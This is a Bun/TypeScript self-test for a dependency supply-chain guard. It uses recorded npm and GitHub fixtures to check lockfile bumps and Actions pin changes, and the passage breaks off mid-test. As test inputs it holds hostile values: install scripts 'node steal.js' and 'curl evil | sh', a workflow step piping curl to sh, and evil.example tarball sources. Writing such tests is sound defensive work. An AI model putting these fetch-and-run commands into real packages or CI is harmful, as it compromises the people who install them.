#!/usr/bin/env bun
/**
 * Hermetic self-test of the dependency supply-chain guard (check-deps-guard.ts + deps-guard/).
 * No network: registry and GitHub answers are recorded fixtures (deps-guard/fixtures/, trimmed
 * real npm responses: hono 4.13.3/.5/.9/.12, why-is-node-running 2.3.0/3.2.2, esbuild 0.28.0/.1,
 * and the real bulk-advisory answer for hono 4.13.3) or hand-built GitHub payloads of the documented
 * REST shape. One case per WITHHOLD reason plus the clean passes that prove the reasons do not
 * fire on ordinary bumps. Run: bun run test:deps-guard
 */
import assert from 'node:assert/strict'
import { execFileSync } from 'node:child_process'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import { evaluateWorkflowChange } from './deps-guard/actions.ts'
import { createGitHubApi } from './deps-guard/github.ts'
import { LockParseError, parseLock } from './deps-guard/lock.ts'
import { evaluateLockChange } from './deps-guard/npm-rules.ts'
import { evaluatePr } from './deps-guard/pr.ts'
import { createNpmRegistry, type FetchFn } from './deps-guard/registry.ts'
import type { ReasonCode, Verdict } from './deps-guard/types.ts'

const ROOT = join(import.meta.dirname, '../..')
const FIX = join(import.meta.dirname, 'deps-guard/fixtures')
const DAY = 86_400
const COOLDOWN = 3 * DAY
const NOW_OK = new Date('2026-10-10T00:00:00Z') // every fixture version is > 3 d old
const NOW_YOUNG = new Date('2026-10-01T00:00:00Z') // hono 4.13.12 (2026-09-30) is 1 d old

type PkgVersion = {
  repository?: { url: string }
  _npmUser: { name?: string; trustedPublisher?: { oidcConfigId: string } }
  dist: { attestations?: unknown }
  scripts: Record<string, string>
}
type Packuments = Record<
  string,
  {
    repository?: { url: string }
    time: Record<string, string>
    versions: Record<string, PkgVersion>
  }
>
/** `name@version` -> the real `/-/npm/v1/attestations/` answer (SLSA provenance, signatures stripped). */
type Attestations = Record<
  string,
  { attestations: { bundle: { dsseEnvelope: { payload: string } } }[] }
>
const basePackuments = JSON.parse(readFileSync(join(FIX, 'packuments.json'), 'utf8')) as Packuments
const baseAttestations = JSON.parse(
  readFileSync(join(FIX, 'attestations.json'), 'utf8'),
) as Attestations
const advisoryFixture = readFileSync(join(FIX, 'advisories-hono-4.13.3.json'), 'utf8')
const clone = <T>(v: T): T => structuredClone(v)

/** A recorded attestation whose SLSA predicate names another source repository. */
function attestationFrom(key: string, repository: string): Attestations {
  const att = clone(baseAttestations)
  const env = att[key]?.attestations[0]?.bundle.dsseEnvelope
  assert.ok(env, `no recorded attestation for ${key}`)
  const statement = JSON.parse(Buffer.from(env.payload, 'base64').toString('utf8'))
  statement.predicate.buildDefinition.externalParameters.workflow.repository = repository
  env.payload = Buffer.from(JSON.stringify(statement)).toString('base64')
  return att
}

/** `down`: the attestation endpoint answers 500. A key missing from the map answers 404. */
function npmFetch(
  packuments: Packuments,
  attestations: Attestations | 'down' = baseAttestations,
): FetchFn {
  return async (url, init) => {
    if (url.includes('/-/npm/v1/attestations/')) {
      if (attestations === 'down') return new Response('', { status: 500 })
      const key = decodeURIComponent(
        url.slice(url.lastIndexOf('/attestations/') + '/attestations/'.length),
      )
      const doc = attestations[key]
      return doc ? Response.json(doc) : new Response('{}', { status: 404 })
    }
    if (url.endsWith('/-/npm/v1/security/advisories/bulk')) {
      assert.equal(init?.method, 'POST')
      return new Response(advisoryFixture, { status: 200 })
    }
    const name = decodeURIComponent(url.slice('https://registry.npmjs.org/'.length))
    const doc = packuments[name]
    return doc ? Response.json(doc) : new Response('{}', { status: 404 })
  }
}

/** Minimal bun.lock text: [name, version, integrity?, registry?, idOverride?]. */
type LockRow = [string, string, string?, string?, string?]
function lock(rows: LockRow[]): string {
  const packages = rows
    .map(([name, version, integrity = `sha512-${name}${version}`, registry = '', id]) => {
      const tuple = [id ?? `${name}@${version}`, registry, {}, integrity]
      return `    ${JSON.stringify(name)}: ${JSON.stringify(tuple)},`
    })
    .join('\n')
  return `{\n  "lockfileVersion": 1,\n  "workspaces": {},\n  "packages": {\n${packages}\n  },\n}\n`
}

async function npmVerdict(
  base: LockRow[],
  head: LockRow[],
  opts: { now?: Date; packuments?: Packuments; attestations?: Attestations | 'down' } = {},
) {
  const registry = createNpmRegistry({
    fetchFn: npmFetch(opts.packuments ?? basePackuments, opts.attestations),
    backoffMs: 1,
    retries: 0,
  })
  return evaluateLockChange(lock(base), lock(head), {
    registry,
    cooldownSeconds: COOLDOWN,
    now: opts.now ?? NOW_OK,
  })
}

function codes(v: Verdict): ReasonCode[] {
  return [...new Set(v.reasons.map((r) => r.code))].sort()
}

const cases: [string, () => Promise<void>][] = []
const test = (name: string, fn: () => Promise<void>) => cases.push([name, fn])

// ---------- npm: clean passes ----------
test('clean bump (hono 4.13.9 -> 4.13.12, provenance kept, same publisher, old enough) passes', async () => {
  const v = await npmVerdict([['hono', '4.13.9']], [['hono', '4.13.12']])
  assert.deepEqual(v.reasons, [])
  assert.equal(v.verdict, 'PASS')
})

test('an unchanged install script (esbuild 0.28.0 -> 0.28.1) is not "new"', async () => {
  const v = await npmVerdict([['esbuild', '0.28.0']], [['esbuild', '0.28.1']])
  assert.equal(v.verdict, 'PASS')
})

test('a lock with no package change passes and checks nothing', async () => {
  const v = await npmVerdict([['hono', '4.13.9']], [['hono', '4.13.9']])
  assert.equal(v.verdict, 'PASS')
  assert.match(v.checked[0] as string, /0 changed\/added/)
})

// ---------- npm: one case per WITHHOLD reason ----------
test('TOO_YOUNG: a version younger than the cooldown is withheld', async () => {
  const v = await npmVerdict([['hono', '4.13.9']], [['hono', '4.13.12']], { now: NOW_YOUNG })
  assert.deepEqual(codes(v), ['TOO_YOUNG'])
  assert.match(v.reasons[0]?.detail as string, /0\.6 d ago\), cooldown is 3\.0 d/)
})

test('PROVENANCE_DOWNGRADE: previous version attested, new one is not', async () => {
  const p = clone(basePackuments)
  delete p.hono?.versions['4.13.12'].dist.attestations
  const v = await npmVerdict([['hono', '4.13.9']], [['hono', '4.13.12']], { packuments: p })
  assert.deepEqual(codes(v), ['PROVENANCE_DOWNGRADE'])
})

test('PUBLISHER_CHANGE: no provenance on the new version (why-is-node-running mafintosh -> jkoops, recorded)', async () => {
  const v = await npmVerdict([['why-is-node-running', '2.3.0']], [['why-is-node-running', '3.2.2']])
  assert.deepEqual(codes(v), ['PUBLISHER_CHANGE'])
  assert.match(v.reasons[0]?.detail as string, /jkoops.*mafintosh/)
  assert.match(v.reasons[0]?.detail as string, /no npm provenance/)
})

test('PUBLISHER_CHANGE accepted: maintainer -> GitHub Actions trusted publishing, provenance from the same repo (tinybench, recorded)', async () => {
  // 2.9.0 has no attestation: its source is the packument repository field (tinylibs/tinybench).
  const v = await npmVerdict([['tinybench', '2.9.0']], [['tinybench', '6.1.4']])
  assert.equal(v.verdict, 'PASS')
  assert.match(
    v.checked.join('\n'),
    /PUBLISHER_CHANGE accepted for tinybench@6\.1\.4.*github\.com\/tinylibs\/tinybench.*packument repository field/,
  )
})

test('PUBLISHER_CHANGE accepted: scoped package (@apidevtools/json-schema-ref-parser, recorded; repo case differs between sources)', async () => {
  const v = await npmVerdict(
    [['@apidevtools/json-schema-ref-parser', '14.0.1']],
    [['@apidevtools/json-schema-ref-parser', '16.0.3']],
  )
  assert.equal(v.verdict, 'PASS')
})

test('PUBLISHER_CHANGE: provenance attests another repository than the previous version', async () => {
  const att = attestationFrom('tinybench@6.1.4', 'https://github.com/mallory/tinybench')
  const v = await npmVerdict([['tinybench', '2.9.0']], [['tinybench', '6.1.4']], {
    attestations: att,
  })
  assert.deepEqual(codes(v), ['PUBLISHER_CHANGE'])
  assert.match(
    v.reasons[0]?.detail as string,
    /attests source github\.com\/mallory\/tinybench, but tinybench@2\.9\.0 came from github\.com\/tinylibs\/tinybench/,
  )
})

test('PUBLISHER_CHANGE: a repository that moved (scheduler facebook/react -> react/react, recorded) still requires independent review', async () => {
  const v = await npmVerdict([['scheduler', '0.27.0']], [['scheduler', '0.28.0']])
  assert.deepEqual(codes(v), ['PUBLISHER_CHANGE'])
  assert.match(
    v.reasons[0]?.detail as string,
    /github\.com\/react\/react.*github\.com\/facebook\/react/,
  )
})

test('PUBLISHER_CHANGE: attestation unavailable (404 or registry down) fails closed', async () => {
  const gone = await npmVerdict([['tinybench', '2.9.0']], [['tinybench', '6.1.4']], {
    attestations: {},
  })
  assert.deepEqual(codes(gone), ['PUBLISHER_CHANGE'])
  assert.match(
    gone.reasons[0]?.detail as string,
    /provenance unreadable: the registry has no attestation document/,
  )
  const down = await npmVerdict([['tinybench', '2.9.0']], [['tinybench', '6.1.4']], {
    attestations: 'down',
  })
  assert.deepEqual(codes(down), ['PUBLISHER_CHANGE'])
  assert.match(down.reasons[0]?.detail as string, /attestation fetch failed/)
})

test('PUBLISHER_CHANGE: previous source repository cannot be resolved', async () => {
  const p = clone(basePackuments)
  delete p.tinybench.repository
  delete p.tinybench.versions['2.9.0'].repository
  const v = await npmVerdict([['tinybench', '2.9.0']], [['tinybench', '6.1.4']], { packuments: p })
  assert.deepEqual(codes(v), ['PUBLISHER_CHANGE'])
  assert.match(
    v.reasons[0]?.detail as string,
    /source repository of tinybench@2\.9\.0 cannot be resolved \(no repository field\)/,
  )
})

test('PUBLISHER_CHANGE: repository spellings (scp-style, ssh://, shorthand, bare string) compare equal', async () => {
  for (const spelling of [
    'git@github.com:TinyLibs/tinybench.git',
    'ssh://git@github.com/tinylibs/tinybench/',
    'github:tinylibs/tinybench',
  ]) {
    const p = clone(basePackuments)
    p.tinybench.versions['2.9.0'].repository = { url: spelling }
    const v = await npmVerdict([['tinybench', '2.9.0']], [['tinybench', '6.1.4']], {
      packuments: p,
    })
    assert.equal(v.verdict, 'PASS', spelling)
  }
})

test('PUBLISHER_CHANGE: a previous version that was attested is compared with ITS attestation, not the repository field', async () => {
  const p = clone(basePackuments)
  p.hono.versions['4.13.9']._npmUser.name = 'someone-else'
  const same = await npmVerdict([['hono', '4.13.9']], [['hono', '4.13.12']], { packuments: p })
  assert.equal(same.verdict, 'PASS')
  assert.match(
    same.checked.join('\n'),
    /same source repository as hono@4\.13\.9 \(its attestation\)/,
  )
  const att = attestationFrom('hono@4.13.9', 'https://github.com/honojs/other')
  const diff = await npmVerdict([['hono', '4.13.9']], [['hono', '4.13.12']], {
    packuments: p,
    attestations: { ...baseAttestations, ...att },
  })
  assert.deepEqual(codes(diff), ['PUBLISHER_CHANGE'])
})

test('PUBLISHER_CHANGE: same _npmUser name but a different trusted-publisher OIDC config is judged by provenance too', async () => {
  const p = clone(basePackuments)
  p.hono.versions['4.13.9']._npmUser.trustedPublisher = { oidcConfigId: 'oidc:old' }
  p.hono.versions['4.13.12']._npmUser.trustedPublisher = { oidcConfigId: 'oidc:new' }
  const same = await npmVerdict([['hono', '4.13.9']], [['hono', '4.13.12']], { packuments: p })
  assert.equal(same.verdict, 'PASS')
  const att = attestationFrom('hono@4.13.12', 'https://github.com/mallory/hono')
  const other = await npmVerdict([['hono', '4.13.9']], [['hono', '4.13.12']], {
    packuments: p,
    attestations: { ...baseAttestations, ...att },
  })
  assert.deepEqual(codes(other), ['PUBLISHER_CHANGE'])
})

test('PROVENANCE_DOWNGRADE alongside a publisher change reports both', async () => {
  const p = clone(basePackuments)
  p.hono.versions['4.13.9']._npmUser.name = 'someone-else'
  delete p.hono.versions['4.13.12'].dist.attestations
  const v = await npmVerdict([['hono', '4.13.9']], [['hono', '4.13.12']], { packuments: p })
  assert.deepEqual(codes(v), ['PROVENANCE_DOWNGRADE', 'PUBLISHER_CHANGE'])
})

test('NEW_INSTALL_SCRIPT: a postinstall the previous version did not have', async () => {
  const p = clone(basePackuments)
  p.hono.versions['4.13.12'].scripts = { postinstall: 'node steal.js' }
  const v = await npmVerdict([['hono', '4.13.9']], [['hono', '4.13.12']], { packuments: p })
  assert.deepEqual(codes(v), ['NEW_INSTALL_SCRIPT'])
  assert.match(
    v.reasons[0]?.detail as string,
    /postinstall: `node steal\.js` \(absent in hono@4\.13\.9\)/,
  )
})

test('NEW_INSTALL_SCRIPT: a changed install command also counts', async () => {
  const p = clone(basePackuments)
  p.esbuild.versions['0.28.1'].scripts = { postinstall: 'node install.js && curl evil | sh' }
  const v = await npmVerdict([['esbuild', '0.28.0']], [['esbuild', '0.28.1']], { packuments: p })
  assert.deepEqual(codes(v), ['NEW_INSTALL_SCRIPT'])
})

test('NEW_PACKAGE_INSTALL_SCRIPT: a package new to the lock that ships an install script', async () => {
  const v = await npmVerdict(
    [['hono', '4.13.9']],
    [
      ['hono', '4.13.9'],
      ['esbuild', '0.28.1'],
    ],
  )
  assert.deepEqual(codes(v), ['NEW_PACKAGE_INSTALL_SCRIPT'])
})

test('a new package without install scripts and with provenance passes (no false positive)', async () => {
  const v = await npmVerdict(
    [['esbuild', '0.28.1']],
    [
      ['esbuild', '0.28.1'],
      ['hono', '4.13.12'],
    ],
  )
  assert.equal(v.verdict, 'PASS')
})

test('NON_REGISTRY: git / non-default registry / tarball resolutions are withheld', async () => {
  const git = await npmVerdict(
    [['left', '1.0.0']],
    [
      ['left', '1.0.0'],
      ['evil', 'github:x/evil#abc', 'sha512-x', '', 'evil@github:x/evil#abc'],
    ],
  )
  assert.deepEqual(codes(git), ['NON_REGISTRY'])
  const reg = await npmVerdict(
    [['hono', '4.13.9']],
    [['hono', '4.13.12', 'sha512-z', 'https://npm.evil.example']],
  )
  assert.deepEqual(codes(reg), ['NON_REGISTRY'])
  const tgz = await npmVerdict(
    [['t', '1.0.0']],
    [
      ['t', '1.0.0'],
      ['u', 'https://evil.example/u.tgz', 'sha512-x', '', 'u@https://evil.example/u.tgz'],
    ],
  )
  assert.deepEqual(codes(tgz), ['NON_REGISTRY'])
})

test('INTEGRITY_CHANGED: same name@version, different hash', async () => {
  const v = await npmVerdict([['hono', '4.13.9', 'sha512-AAA']], [['hono', '4.13.9', 'sha512-BBB']])
  assert.deepEqual(codes(v), ['INTEGRITY_CHANGED'])
})

test('ADVISORY: a bump onto a version inside a recorded GHSA range is withheld (hono 4.13.9 -> 4.13.3, <4.13.7)', async () => {
  const v = await npmVerdict([['hono', '4.13.9']], [['hono', '4.13.3']])
  assert.deepEqual(codes(v), ['ADVISORY'])
  assert.match(v.reasons.map((r) => r.detail).join('\n'), /GHSA-hxh3-vqpv-xpqv/)
})

test('ADVISORY: a package new to the lock is judged against every matching advisory', async () => {
  const v = await npmVerdict(
    [['esbuild', '0.28.1']],
    [
      ['esbuild', '0.28.1'],
      ['hono', '4.13.3'],
    ],
  )
  assert.deepEqual(codes(v), ['ADVISORY'])
})

test('ADVISORY: a partial fix that stays inside an advisory the old version already had adds nothing (4.13.3 -> 4.13.5, <4.13.7)', async () => {
  const v = await npmVerdict([['hono', '4.13.3']], [['hono', '4.13.5']])
  assert.equal(v.verdict, 'PASS')
})

test('ADVISORY: a version outside every recorded range passes (4.13.3 -> 4.13.12)', async () => {
  const v = await npmVerdict([['hono', '4.13.3']], [['hono', '4.13.12']])
  assert.equal(v.verdict, 'PASS')
})

test('METADATA_UNAVAILABLE: a version the registry does not know fails closed', async () => {
  const v = await npmVerdict([['hono', '4.13.9']], [['hono', '9.9.9']])
  assert.deepEqual(codes(v), ['METADATA_UNAVAILABLE'])
})

test('METADATA_UNAVAILABLE: the previous version is unknown, so nothing can be compared', async () => {
  const v = await npmVerdict([['hono', '4.12.0']], [['hono', '4.13.12']])
  assert.deepEqual(codes(v), ['METADATA_UNAVAILABLE'])
})

test('METADATA_UNAVAILABLE: no publish time in the packument', async () => {
  const p = clone(basePackuments)
  delete p.hono.time['4.13.12']
  const v = await npmVerdict([['hono', '4.13.9']], [['hono', '4.13.12']], { packuments: p })
  assert.deepEqual(codes(v), ['METADATA_UNAVAILABLE'])
})

test('REGENERATE_TYPES: any wrangler change is withheld with the regenerate instruction', async () => {
  const p = clone(basePackuments)
  p.wrangler = {
    time: { '4.141.0': '2026-08-01T00:00:00Z', '4.147.0': '2026-09-01T00:00:00Z' },
    versions: {
      '4.141.0': clone(p.hono.versions['4.13.9']),
      '4.147.0': clone(p.hono.versions['4.13.12']),
    },
  }
  const v = await npmVerdict([['wrangler', '4.141.0']], [['wrangler', '4.147.0']], {
    packuments: p,
  })
  assert.deepEqual(codes(v), ['REGENERATE_TYPES'])
  assert.match(v.reasons[0]?.detail as string, /runtime types must be regenerated/)
})

test('a nested instance moving onto a version the lock already holds adds nothing new to judge', async () => {
  const same = 'sha512-h412'
  const base: LockRow[] = [
    ['hono', '4.13.12', same],
    ['x/hono', '4.13.9', undefined, '', 'hono@4.13.9'],
  ]
  const head: LockRow[] = [
    ['hono', '4.13.12', same],
    ['x/hono', '4.13.12', same, '', 'hono@4.13.12'],
  ]
  const v = await npmVerdict(base, head)
  assert.equal(v.verdict, 'PASS')
  assert.match(v.checked[0] as string, /0 changed/)
})

test('a transitive instance bumped under a nested key is judged by name@version', async () => {
  const base: LockRow[] = [['x/hono', '4.13.9', undefined, '', 'hono@4.13.9']]
  const head: LockRow[] = [['x/hono', '4.13.12', undefined, '', 'hono@4.13.12']]
  const young = await npmVerdict(base, head, { now: NOW_YOUNG })
  assert.deepEqual(codes(young), ['TOO_YOUNG'])
})

test('lock parsing: workspaces are skipped, npm: aliases resolve to the target, garbage throws', async () => {
  const pk = parseLock(
    lock([
      ['hono', '4.13.9'],
      ['alias', 'x', undefined, '', 'alias@npm:hono@4.13.9'],
      ['@kit/core', 'x', undefined, '', '@kit/core@workspace:packages/core'],
    ]),
  )
  assert.deepEqual(
    pk.map((p) => `${p.name}@${p.version}:${p.nonRegistry ? 'bad' : 'ok'}`),
    ['hono@4.13.9:ok', 'hono@4.13.9:ok'],
  )
  assert.throws(() => parseLock('not json {'), LockParseError)
  assert.throws(() => parseLock('{"packages": []}'), LockParseError)
})

test('registry client: retries a 503 then succeeds; a persistent 500 throws (guard fails, never passes)', async () => {
  let calls = 0
  const flaky: FetchFn = async (url, init) =>
    ++calls === 1 ? new Response('', { status: 503 }) : npmFetch(basePackuments)(url, init)
  const ok = await createNpmRegistry({ fetchFn: flaky, backoffMs: 1 }).version('hono', '4.13.9')
  assert.equal(ok?.attested, true)
  assert.equal(calls, 2)
  const dead = createNpmRegistry({
    fetchFn: async () => new Response('', { status: 500 }),
    backoffMs: 1,
    retries: 1,
  })
  await assert.rejects(dead.version('hono', '4.13.9'), /registry request failed/)
})

// ---------- github-actions ----------
const SHA_GOOD = 'a'.repeat(40)
const SHA_IMPOSTOR = 'b'.repeat(40)
const SHA_TAGGED = 'c'.repeat(40)
const SHA_OLD = 'd'.repeat(40)
const wf = (sha: string, tag: string, extra = '') =>
  `name: CI\njobs:\n  a:\n    steps:\n      - uses: acme/tool@${sha} # ${tag}\n${extra}      - run: echo ok\n`

function githubFetch(
  routes: Record<string, { status?: number; body?: unknown; text?: string }>,
): FetchFn {
  return async (url) => {
    const path = url.replace('https://api.github.com', '')
    const hit = routes[path]
    if (!hit)
      return new Response(JSON.stringify({ message: `no fixture for ${path}` }), { status: 404 })
    return hit.text !== undefined
      ? new Response(hit.text, { status: hit.status ?? 200 })
      : Response.json(hit.body, { status: hit.status ?? 200 })
  }
}
const actionRoutes = {
  '/repos/acme/tool': { body: { default_branch: 'main' } },
  [`/repos/acme/tool/compare/main...${SHA_GOOD}`]: { body: { status: 'behind' } },
  [`/repos/acme/tool/compare/main...${SHA_IMPOSTOR}`]: { body: { status: 'diverged' } },
  [`/repos/acme/tool/compare/main...${SHA_TAGGED}`]: { body: { status: 'ahead' } },
  '/repos/acme/tool/git/ref/tags/v2.0.0': { body: { object: { type: 'commit', sha: SHA_TAGGED } } },
  '/repos/acme/tool/git/ref/tags/v9.9.9': { body: { object: { type: 'commit', sha: SHA_GOOD } } },
}
const actionVerdict = (files: { path: string; base?: string; head?: string }[]) =>
  evaluateWorkflowChange(
    createGitHubApi('t', githubFetch(actionRoutes)),
    files.map((f) => ({ path: f.path, base: f.base, head: f.head })),
  )

test('actions: a new SHA on the default branch passes', async () => {
  const v = await actionVerdict([
    { path: '.github/workflows/ci.yml', base: wf(SHA_OLD, 'v1.0.0'), head: wf(SHA_GOOD, 'v1.1.0') },
  ])
  assert.equal(v.verdict, 'PASS')
})

test('ACTION_IMPOSTOR: a SHA that is neither on the default branch nor the commit of its tag', async () => {
  const v = await actionVerdict([
    {
      path: '.github/workflows/ci.yml',
      base: wf(SHA_OLD, 'v1.0.0'),
      head: wf(SHA_IMPOSTOR, 'v1.1.0'),
    },
  ])
  assert.deepEqual(codes(v), ['ACTION_IMPOSTOR'])
})

test('actions: a SHA off the default branch passes only when it is exactly the commit of its commented tag', async () => {
  const ok = await actionVerdict([
    {
      path: '.github/workflows/ci.yml',
      base: wf(SHA_OLD, 'v1.0.0'),
      head: wf(SHA_TAGGED, 'v2.0.0'),
    },
  ])
  assert.equal(ok.verdict, 'PASS')
  const lie = await actionVerdict([
    {
      path: '.github/workflows/ci.yml',
      base: wf(SHA_OLD, 'v1.0.0'),
      head: wf(SHA_TAGGED, 'v9.9.9'),
    },
  ])
  assert.deepEqual(codes(lie), ['ACTION_IMPOSTOR'])
})

test('ACTION_UNPINNED: a floating tag or branch as the new ref', async () => {
  const v = await actionVerdict([
    {
      path: '.github/workflows/ci.yml',
      base: wf(SHA_OLD, 'v1.0.0'),
      head: 'name: CI\njobs:\n  a:\n    steps:\n      - uses: acme/tool@v7\n      - run: echo ok\n',
    },
  ])
  assert.deepEqual(codes(v), ['ACTION_UNPINNED'])
})

test('WORKFLOW_BEYOND_PINS: a changed run step, a new step, or an added/deleted file is not a pin bump', async () => {
  const changedRun = await actionVerdict([
    {
      path: '.github/workflows/ci.yml',
      base: wf(SHA_OLD, 'v1.0.0'),
      head: wf(SHA_GOOD, 'v1.1.0').replace('echo ok', 'curl evil | sh'),
    },
  ])
  assert.deepEqual(codes(changedRun), ['WORKFLOW_BEYOND_PINS'])
  const added = await actionVerdict([
    { path: '.github/workflows/new.yml', head: wf(SHA_GOOD, 'v1.1.0') },
  ])
  assert.deepEqual(codes(added), ['WORKFLOW_BEYOND_PINS'])
  const deleted = await actionVerdict([
    { path: '.github/workflows/old.yml', base: wf(SHA_GOOD, 'v1.1.0') },
  ])
  assert.deepEqual(codes(deleted), ['WORKFLOW_BEYOND_PINS'])
})

// ---------- PR level ----------
const BASE = 'a'.repeat(40)
const HEAD = 'b'.repeat(40)
const MERGE_BASE = 'c'.repeat(40)
const SNAPSHOT = {
  repositoryId: 1,
  pullRequestId: 2,
  pullRequest: 7,
  baseSha: BASE,
  headSha: HEAD,
  baseRef: 'main',
}
const metadata = (name = 'hono', type = 'version-update:semver-patch') =>
  `Bump dependency\n\n---\nupdated-dependencies:\n- dependency-name: ${name}\n  update-type: ${type}\n...\n`
const dependabotCommit = {
  sha: HEAD,
  author: { login: 'dependabot[bot]' },
  committer: { login: 'web-flow' },
  commit: { message: metadata(), verification: { verified: true } },
}

type PrOptions = {
  author?: string
  commits?: unknown[]
  files?: string[]
  fileStatus?: string
  product?: boolean
  policy?: string | null
  marker?: string | null
  headMarker?: string | null
  declaration?: string | null
  headDeclaration?: string | null
  ownershipError?: boolean
  policyReadError?: boolean
  workflowHeadSha?: string
  now?: Date
  head?: LockRow[]
  message?: string
  actualHead?: string
  actualBase?: string
  laterHead?: string
  laterBase?: string
  refSha?: string
  compareTotal?: number
}

function prIdentityRoutes(opts: PrOptions, marker: string | null, declaration: string | null) {
  const routes = new Map<string, Response>()
  const baseUrl = 'https://api.github.com/repos/o/r/contents/'
  const add = (path: string, sha: string, value: string | null) => {
    routes.set(
      `${baseUrl}${path}?ref=${sha}`,
      value === null ? new Response('', { status: 404 }) : new Response(value),
    )
  }
  for (const sha of [MERGE_BASE, BASE, HEAD]) {
    add(
      'config/product/inheritance.json',
      sha,
      sha === HEAD && opts.headMarker !== undefined ? opts.headMarker : marker,
    )
    add(
      'config/product/deploy-gate.json',
      sha,
      sha === HEAD && opts.headDeclaration !== undefined ? opts.headDeclaration : declaration,
    )
  }
  if (opts.ownershipError) {
    routes.set(
      `${baseUrl}config/product/inheritance.json?ref=${BASE}`,
      new Response('failure', { status: 500 }),
    )
  }
  return routes
}

function prIdentityResponse(opts: PrOptions) {
  const marker =
    opts.marker === undefined
      ? opts.product
        ? JSON.stringify({ upstreamCommit: 'e'.repeat(40) })
        : null
      : opts.marker
  const declaration =
    opts.declaration === undefined ? (opts.product ? '{"workflows":[]}' : null) : opts.declaration
  const routes = prIdentityRoutes(opts, marker, declaration)
  return (url: string): Response | undefined => routes.get(url)
}

function prFixtureApi(opts: PrOptions) {
  const baseLock = lock([['hono', '4.13.9']])
  const headLock = lock(opts.head ?? [['hono', '4.13.12']])
  let pullReads = 0
  const fixtureFetch = githubFetch({
    ...actionRoutes,
    [`/repos/o/r/contents/.github/workflows/ci.yml?ref=${MERGE_BASE}`]: {
      text: wf(SHA_OLD, 'v1.0.0'),
    },
    [`/repos/o/r/contents/.github/workflows/ci.yml?ref=${HEAD}`]: {
      text: wf(opts.workflowHeadSha ?? SHA_GOOD, 'v1.1.0'),
    },
    [`/repos/o/r/contents/.github/workflows/product-ci.yml?ref=${MERGE_BASE}`]: {
      text: wf(SHA_OLD, 'v1.0.0'),
    },
    [`/repos/o/r/contents/.github/workflows/product-ci.yml?ref=${HEAD}`]: {
      text: wf(opts.workflowHeadSha ?? SHA_GOOD, 'v1.1.0'),
    },
    [`/repos/o/r/contents/.github/workflows/other.yml?ref=${MERGE_BASE}`]: {
      text: wf(SHA_OLD, 'v1.0.0'),
    },
    [`/repos/o/r/contents/.github/workflows/other.yml?ref=${HEAD}`]: {
      text: wf(SHA_GOOD, 'v1.1.0'),
    },
    '/repos/o/r/git/ref/heads/main': {
      body: { ref: 'refs/heads/main', object: { sha: opts.refSha ?? BASE } },
    },
    '/repos/o/r/pulls/7': {
      body: {
        id: 2,
        number: 7,
        state: 'open',
        user: { id: 49699333, login: opts.author ?? 'dependabot[bot]' },
        base: { sha: opts.actualBase ?? BASE, ref: 'main', repo: { id: 1 } },
        head: { sha: opts.actualHead ?? HEAD },
      },
    },
    [`/repos/o/r/compare/${BASE}...${HEAD}?per_page=100&page=1`]: {
      body: {
        status: 'ahead',
        ahead_by: opts.compareTotal ?? opts.commits?.length ?? 1,
        total_commits: opts.compareTotal ?? opts.commits?.length ?? 1,
        base_commit: { sha: BASE },
        merge_base_commit: { sha: MERGE_BASE },
        commits: opts.commits ?? [
          {
            ...dependabotCommit,
            commit: { ...dependabotCommit.commit, message: opts.message ?? metadata() },
          },
        ],
        files: (opts.files ?? ['bun.lock']).map((filename) => ({
          filename,
          status: opts.fileStatus ?? 'modified',
        })),
      },
    },
    [`/repos/o/r/contents/bun.lock?ref=${MERGE_BASE}`]: { text: baseLock },
    [`/repos/o/r/contents/bun.lock?ref=${HEAD}`]: { text: headLock },
  })
  const identityResponse = prIdentityResponse(opts)
  const currentResponse = (url: string): Response | undefined => {
    if (url.endsWith('/repos/o/r/git/ref/heads/main') && pullReads > 1 && opts.laterBase) {
      return Response.json({ ref: 'refs/heads/main', object: { sha: opts.laterBase } })
    }
    if (
      url.endsWith('/repos/o/r/pulls/7') &&
      ++pullReads > 1 &&
      (opts.laterHead || opts.laterBase)
    ) {
      return Response.json({
        id: 2,
        number: 7,
        state: 'open',
        user: { id: 49699333, login: opts.author ?? 'dependabot[bot]' },
        base: { sha: opts.laterBase ?? BASE, ref: 'main', repo: { id: 1 } },
        head: { sha: opts.laterHead ?? HEAD },
      })
    }
    return undefined
  }
  return createGitHubApi(
    't',
    async (url, init) => identityResponse(url) ?? currentResponse(url) ?? fixtureFetch(url, init),
  )
}

async function prVerdict(opts: PrOptions) {
  const api = prFixtureApi(opts)
  const registry = createNpmRegistry({
    fetchFn: npmFetch(basePackuments),
    backoffMs: 1,
    retries: 0,
  })
  return evaluatePr({
    repo: 'o/r',
    snapshot: SNAPSHOT,
    cooldownSeconds: COOLDOWN,
    readOwnershipPolicy: () => {
      if (opts.policyReadError || opts.policy === null) throw new Error('policy unavailable')
      return (
        opts.policy ??
        JSON.stringify({
          version: 1,
          protected_prefixes: ['packages/', 'apps/example-api/', 'apps/example-web/'],
          protected_files: ['package.json', '.github/workflows/ci.yml'],
          kit_origin_allowlist: opts.product ? ['kit/repo'] : ['o/r'],
          inheritance_file: 'config/product/inheritance.json',
        })
      )
    },
    now: opts.now ?? NOW_OK,
    registry,
    api,
  })
}

test('PR: a Dependabot-only bun.lock bump passes end to end (merge base read through the API)', async () => {
  const v = await prVerdict({})
  assert.equal(v.verdict, 'PASS')
  assert.match(v.checked.join('\n'), /commits: 1 checked/)
})

test('manifest ownership follows paths, not shared dependency names or the shared lock', async () => {
  for (const path of ['apps/product-web/package.json', 'apps/example-api-extra/package.json']) {
    const product = await prVerdict({ product: true, files: [path, 'bun.lock'] })
    assert.equal(product.verdict, 'PASS')
  }
  for (const path of [
    'package.json',
    'packages/ui/package.json',
    'apps/example-api/package.json',
    'apps/example-web/package.json',
  ]) {
    const product = await prVerdict({ product: true, files: [path, 'bun.lock'] })
    assert.deepEqual(codes(product), ['KIT_PATH'])
    assert.equal(product.reasons[0]?.subject, path)
    const kit = await prVerdict({ files: [path, 'bun.lock'] })
    assert.equal(kit.verdict, 'PASS')
  }
})

test('ownership uses the trusted policy port without repository metadata or live default-branch policy reads', async () => {
  // The GitHub fixture deliberately exposes neither repository metadata nor a remote policy.
  const verdict = await prVerdict({
    product: true,
    files: ['apps/product-web/package.json', 'bun.lock'],
  })
  assert.equal(verdict.verdict, 'PASS')
})

test('protected workflow pins withhold in Product while Product and Kit pins remain eligible', async () => {
  const kitWorkflow = '.github/workflows/ci.yml'
  const productWorkflow = '.github/workflows/product-ci.yml'
  const protectedUpdate = await prVerdict({ product: true, files: [kitWorkflow] })
  assert.deepEqual(codes(protectedUpdate), ['KIT_PATH'])
